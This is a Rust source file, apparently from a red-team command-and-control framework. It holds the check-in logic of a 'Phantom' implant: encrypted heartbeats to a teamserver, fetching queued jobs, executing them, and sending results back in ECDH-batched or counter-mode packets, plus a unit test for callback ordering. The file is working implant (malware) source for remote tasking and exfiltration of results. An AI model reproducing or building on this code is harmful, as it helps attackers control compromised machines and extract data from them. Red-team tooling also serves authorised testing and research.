//! Pending callback queue management and checkin dispatch.

use red_cell_common::demon::{DemonCommand, DemonMessage, DemonPackage};
use tracing::warn;

use super::PhantomAgent;
use crate::command::{PendingCallback, execute};
use crate::error::PhantomError;
use crate::protocol::{build_callback_packet, callback_ctr_blocks};

/// Build a [`DemonPackage`] for each callback in order (single ECDH `DemonMessage` batch).
fn demon_packages_for_callbacks(
    callbacks: Vec<PendingCallback>,
) -> Result<Vec<DemonPackage>, PhantomError> {
    let mut out = Vec::with_capacity(callbacks.len());
    for callback in callbacks {
        let payload = callback.payload()?;
        out.push(DemonPackage {
            command_id: callback.command_id(),
            request_id: callback.request_id(),
            payload,
        });
    }
    Ok(out)
}

impl PhantomAgent {
    /// Send a `COMMAND_CHECKIN` heartbeat, then fetch and dispatch queued tasks
    /// with a separate `COMMAND_GET_JOB` request.
    ///
    /// When an ECDH session is active, this sends a single combined session packet
    /// containing both `CommandCheckin` and `CommandGetJob`, then sends each task’s
    /// callback batch as one ECDH session packet (one `seq` + one `DemonMessage`
    /// that may contain several packages, e.g. `CommandProc` + `CommandOutput`).
    ///
    /// Without ECDH, mirrors Specter's two-request pattern: the teamserver's
    /// `handle_checkin` returns no task bytes, so tasks must be fetched via a
    /// follow-up `CommandGetJob` call.
    pub async fn checkin(&mut self) -> Result<bool, PhantomError> {
        self.state.poll().await?;

        if self.ecdh_session.is_some() {
            return self.ecdh_checkin().await;
        }

        self.flush_pending_callbacks().await?;

        // Send COMMAND_CHECKIN heartbeat; the server always returns an empty body.
        let packet = build_callback_packet(
            self.agent_id,
            &self.session_crypto,
            self.ctr_offset,
            self.callback_seq,
            u32::from(DemonCommand::CommandCheckin),
            0,
            &[],
        )?;
        let _response = self.transport.send(&packet).await?;
        self.ctr_offset += callback_ctr_blocks(0);
        self.callback_seq += 1;

        // Fetch queued tasks with a separate COMMAND_GET_JOB request.
        let packages = self.get_job().await?;

        let mut exit_requested = false;
        for package in packages {
            execute(&package, &mut self.config, &mut self.state).await?;
            for callback in self.state.drain_callbacks() {
                let payload = callback.payload()?;
                let packet = build_callback_packet(
                    self.agent_id,
                    &self.session_crypto,
                    self.ctr_offset,
                    self.callback_seq,
                    callback.command_id(),
                    callback.request_id(),
                    &payload,
                )?;
                self.send_packet(packet).await?;
                self.ctr_offset += callback_ctr_blocks(payload.len());
                self.callback_seq += 1;
                if matches!(callback, PendingCallback::Exit { .. }) {
                    exit_requested = true;
                }
            }
        }

        Ok(exit_requested)
    }

    /// ECDH-mode checkin: combines checkin + get_job into one encrypted session packet.
    async fn ecdh_checkin(&mut self) -> Result<bool, PhantomError> {
        // First flush any pending callbacks as a batched ECDH session packet.
        self.ecdh_flush_pending_callbacks().await?;

        // Send [CommandCheckin, CommandGetJob] in one session packet.
        let packages = vec![
            DemonPackage::new(DemonCommand::CommandCheckin, 0, Vec::new()),
            DemonPackage::new(DemonCommand::CommandGetJob, 0, Vec::new()),
        ];
        let response = self.ecdh_send_packages(packages).await?;

        // Response is DemonMessage bytes containing job packages (if any).
        if response.is_empty() {
            return Ok(false);
        }
        let job_message = DemonMessage::from_bytes(&response)
            .map_err(|e| PhantomError::Transport(format!("ECDH job parse: {e}")))?;

        let mut exit_requested = false;
        for package in job_message.packages {
            execute(&package, &mut self.config, &mut self.state).await?;
            let callbacks = self.state.drain_callbacks();
            for c in &callbacks {
                if matches!(c, PendingCallback::Exit { .. }) {
                    exit_requested = true;
                }
            }
            if !callbacks.is_empty() {
                let pkgs = demon_packages_for_callbacks(callbacks)?;
                if let Err(e) = self.ecdh_send_packages(pkgs).await {
                    warn!(error = %e, "ecdh: failed to send callback batch");
                }
            }
        }

        Ok(exit_requested)
    }

    /// Flush pending callbacks over ECDH (one session packet; one `DemonMessage` for the batch).
    async fn ecdh_flush_pending_callbacks(&mut self) -> Result<(), PhantomError> {
        let callbacks = self.state.drain_callbacks();
        if callbacks.is_empty() {
            return Ok(());
        }
        let pkgs = demon_packages_for_callbacks(callbacks)?;
        let _ = self.ecdh_send_packages(pkgs).await?;
        Ok(())
    }

    pub(super) async fn flush_pending_callbacks(&mut self) -> Result<(), PhantomError> {
        if self.ecdh_session.is_some() {
            return self.ecdh_flush_pending_callbacks().await;
        }
        for callback in self.state.drain_callbacks() {
            let payload = callback.payload()?;
            let packet = build_callback_packet(
                self.agent_id,
                &self.session_crypto,
                self.ctr_offset,
                self.callback_seq,
                callback.command_id(),
                callback.request_id(),
                &payload,
            )?;
            self.send_packet(packet).await?;
            self.ctr_offset += callback_ctr_blocks(payload.len());
            self.callback_seq += 1;
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use red_cell_common::demon::DemonCommand;

    use super::demon_packages_for_callbacks;
    use crate::command::PendingCallback;

    #[test]
    fn callback_batch_bundles_proc_then_output_in_order() {
        let callbacks = vec![
            PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id: 7,
                payload: vec![0xab, 0xcd],
            },
            PendingCallback::Output { request_id: 7, text: "batch-out".to_string() },
        ];
        let pkgs = demon_packages_for_callbacks(callbacks).expect("packages");
        assert_eq!(pkgs.len(), 2);
        assert_eq!(pkgs[0].command_id, u32::from(DemonCommand::CommandProc));
        assert_eq!(pkgs[1].command_id, u32::from(DemonCommand::CommandOutput));
    }
}
